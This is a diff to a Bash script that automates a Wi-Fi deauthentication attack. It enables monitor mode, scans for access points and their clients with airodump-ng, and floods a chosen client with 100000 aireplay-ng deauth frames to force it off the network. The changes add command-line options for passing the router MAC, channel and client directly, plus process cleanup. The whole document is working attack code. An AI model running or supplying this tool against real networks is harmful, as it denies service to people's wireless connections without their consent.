@@ -1,4 +1,6 @@
 #!/usr/bin/env bash
+export LANG=en_US.UTF-8
+export LC_ALL=en_US.UTF-8
 
 ### Progress-bar
 progress_bar() {
@@ -35,13 +37,36 @@ init_terminal() {
   printf '\e[1A'                      # move cursor up
 }
 
-### Clean terminal on exit
-clean_terminal() {
-  # kill "$PB_PID" 2>/dev/null
-  # wait "$PB_PID" 2>/dev/null
+### Clean terminal-screen on exit
+cleanup_screen() {
   printf '\e[1;%dr' "$LINES"
   printf '\e[%d;1H' "$LINES"
   printf '\e[0K'
+}
+
+### Terminate airodump-ng PID on exit
+terminate_pids() {
+  cleanup_screen
+  if [[ -n "$DUMP_PID" ]]; then
+    kill "$DUMP_PID" 2>/dev/null
+    wait "$DUMP_PID" 2>/dev/null
+  fi
+  if [[ -n "$PB_PID" ]]; then
+    kill "$PB_PID" 2>/dev/null
+    wait "$PB_PID" 2>/dev/null
+  fi
+  if [[ -n "$scan_routers_PID" ]]; then
+    kill "$scan_routers_PID" 2>/dev/null
+    wait "$scan_routers_PID" 2>/dev/null
+  fi
+  if [[ -n "$scan_clients_PID" ]]; then
+    kill "$scan_clients_PID" 2>/dev/null
+    wait "$scan_clients_PID" 2>/dev/null
+  fi
+  printf '\n[+] Exiting...\n'
+  if [[ -n "${TRAP_SIGNAL:-}" ]]; then
+    exit 130
+  fi
 }
 
 ### Start loading
@@ -66,6 +91,23 @@ process_echo() {
   done
 }
 
+### Get options
+get_opts() {
+  while getopts 'r:c:t:' opt 2>/dev/null; do
+    case "$opt" in
+      r) mac="$OPTARG"
+        ;;
+      c) channel="$OPTARG"
+        ;;
+      t) client="$OPTARG"
+        ;;
+      ?) echo "Undefined option"
+        exit
+        ;;
+    esac
+  done
+}
+
 ### Check if packages are installed
 check_packages() {
   packages=("iw" "airodump-ng" "aireplay-ng" "airmon-ng")
@@ -80,8 +122,8 @@ check_packages() {
 
 ### Get the list of wifi interfaces
 get_interfaces() {
-  mapfile -t interfaces < <(iw dev | awk '$1=="Interface" {print $2}')
-  if [[ ${#interfaces[@]} -eq 0 ]]    #  this symbol --> #  is count
+  mapfile -t interfaces < <(iw dev | awk '$1=="Interface" {iface=$2} $1=="type" {print iface, $2}')
+  if [[ ${#interfaces[@]} -eq 0 ]]
   then
     echo "No wireless interfaces available"
     exit 1
@@ -90,25 +132,34 @@ get_interfaces() {
 
 ### Enable monitor mode
 enable_monitor_mode() {
-  interface="${interfaces[0]}"
+  interface=$(awk '{print $1}' <<< "${interfaces[0]}")
+  type=$(awk '{print $2}' <<< "${interfaces[0]}")
+
+  if [[  "${type}" == "monitor"  ]]; then
+    echo "[+] Monitor mode is already enabled on interface: ${interface}"
+    return
+  fi
+
   ifconfig "${interface}" down > /dev/null &&
   airmon-ng check kill > /dev/null &&
   iw dev "${interface}" set type monitor > /dev/null &&
   ifconfig "${interface}" up > /dev/null
+  echo "[+] Monitor mode enabled on interface: ${interface}"
 }
 
+### Scan routers
 scan_routers() {
   shopt -s nullglob
-  rm routers*
+  rm -f routers*
 
   airodump-ng --band a "$interface" --write routers --write-interval 1 >/dev/null &
-  local PID=$!
+  scan_routers_PID=$!
 
-  echo "[+] Scanning network... PID: ${PID}" | process_echo
-  sleep 10
-  kill "$PID" 2>/dev/null
-  wait "$PID" 2>/dev/null
-  echo "[+] Scanning network DONE PID: ${PID}" | process_echo
+  echo "[+] Scanning network... (press any key to continue or wait 10s) PID: ${scan_routers_PID}" | process_echo
+  read -r -t 10 -n 1 </dev/tty 2>/dev/null || true
+  kill "$scan_routers_PID" 2>/dev/null
+  wait "$scan_routers_PID" 2>/dev/null
+  echo "[+] Scanning network DONE PID: ${scan_routers_PID}" | process_echo
 
   ### parsing SCV
   mapfile -t routers < <(
@@ -118,9 +169,10 @@ scan_routers() {
   )
 
   shopt -s nullglob
-  rm routers*
+  rm -f routers*
 }
 
+### Select router
 select_router() {
   PS3='Select network: '
   COLUMNS=1
@@ -128,21 +180,22 @@ select_router() {
     router="${r}"
     break
   done
+  printf '\n'
 }
 
+### Scan clients on selected router
 scan_router_clients() {
   shopt -s nullglob
-  rm clients-*
+  rm -f clients-*
 
-  read -r mac channel _ name <<< "${router}"
   airodump-ng --bssid "$mac" --channel "$channel" --write clients --write-interval 1 >/dev/null "wlan0" &
-  local PID=$!
+  scan_clients_PID=$!
 
-  echo "[+] Scanning for clients on network '$mac $name'.' PID: $PID" | process_echo
-  sleep 15
-  kill "$PID" 2>/dev/null
-  wait "$PID" 2>/dev/null
-  echo "[+] Scanning clients DONE PID: ${PID}" | process_echo
+  echo "[+] Scanning for clients on network '$mac $name'...(press any key to continue or wait 15s)' PID: ${scan_clients_PID}" | process_echo
+  read -r -t 15 -n 1 </dev/tty 2>/dev/null || true
+  kill "$scan_clients_PID" 2>/dev/null
+  wait "$scan_clients_PID" 2>/dev/null
+  echo "[+] Scanning clients DONE PID: ${scan_clients_PID}" | process_echo
 
   ### parsing SCV
   mapfile -t clients < <(
@@ -152,9 +205,10 @@ scan_router_clients() {
   )
 
   shopt -s nullglob
-  rm clients-*
+  rm -f clients-*
 }
 
+### Select router client
 select_router_client() {
   PS3='Select client to disconect from network: '
   COLUMNS=1
@@ -164,41 +218,51 @@ select_router_client() {
   done
 }
 
-
+### Main function
 main() {
- 
+  trap 'TRAP_SIGNAL=1; terminate_pids' SIGINT SIGTERM
+  trap terminate_pids EXIT
+
   ### check
   check_packages
   get_interfaces
-
-  trap clean_terminal EXIT SIGINT SIGTERM
-  ### scan network routers
-  init_terminal
-  loading &
-  PB_PID=$!
   enable_monitor_mode
-  scan_routers
-  kill "$PB_PID" 2>/dev/null
-  wait "$PB_PID" 2>/dev/null
-  clean_terminal
-  select_router
+
+  ### scan network routers
+  if [[ -z "$mac" || -z "$channel" ]]; then
+    init_terminal
+    loading &
+    PB_PID=$!
+    scan_routers
+    kill "$PB_PID" 2>/dev/null
+    wait "$PB_PID" 2>/dev/null
+    cleanup_screen
+    select_router
+    read -r mac channel _ name <<< "${router}"
+  fi
 
   ### scan clients on network
-  init_terminal
-  loading &
-  PB_PID=$!
-  scan_router_clients
-  kill "$PB_PID" 2>/dev/null
-  wait "$PB_PID" 2>/dev/null
-  clean_terminal
-  
+  if [[ -z "$client" ]]; 
+  then
+    init_terminal
+    loading &
+    PB_PID=$!
+    scan_router_clients
+    kill "$PB_PID" 2>/dev/null
+    wait "$PB_PID" 2>/dev/null
+    cleanup_screen
+    select_router_client
+  fi
+ 
   ### Disconect client
-  select_router_client
-  airodump-ng --band a --bssid "$router" --channel "$channel" "$interface" &> /dev/null &
-  local DUMP_PID=$!
-  aireplay-ng --deauth 100000 -a "$router" -c "$client" -D "$interface" &> /dev/null &
-  local PLAY_PID=$!
-  echo "Client $client disconnected from network with process PLAY_PID: $PLAY_PID and DUMP_PID: $DUMP_PID" | process_echo
+  airodump-ng --band a --bssid "$mac" --channel "$channel" "$interface" 1> /dev/null &
+  DUMP_PID=$!
+  echo; echo; 
+  aireplay-ng --deauth 100000 -a "$mac" -c "$client" -D "$interface" 2>&1 | tr '\n' '\r'
 }
 
+if [[ $# -gt 0 ]]; 
+then 
+  get_opts "$@" 
+fi
 main
